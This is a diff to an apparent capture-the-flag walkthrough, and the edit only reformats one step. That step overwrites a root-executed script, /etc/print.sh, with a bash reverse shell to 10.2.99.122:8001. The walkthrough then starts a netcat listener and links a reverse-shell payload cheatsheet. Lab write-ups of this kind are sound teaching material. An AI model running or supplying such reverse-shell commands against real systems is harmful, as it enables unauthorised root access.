@@ -342,7 +342,9 @@ Looking at /etc/print.sh and find lennie is allowed to edit this file
 
 Perfect, now edit the file so that when root runs planner.sh it will also execute print.sh. Create a reverse shell command using the <a class="link-a" href="https://github.com/safwanpaloli/Reverse-shell/blob/main/Reverse%20shell%20payloads">Reverse Shell Cheatsheet</a>, editing only the local IP address of your system
 
-> echo 'bash -c "bash -i >& /dev/tcp/10.2.99.122/8001 0>&1"' > /etc/print.sh
+```
+echo 'bash -c "bash -i >& /dev/tcp/10.2.99.122/8001 0>&1"' > /etc/print.sh
+```
 
 set up a nc listener and wait around a minute for a callback
 
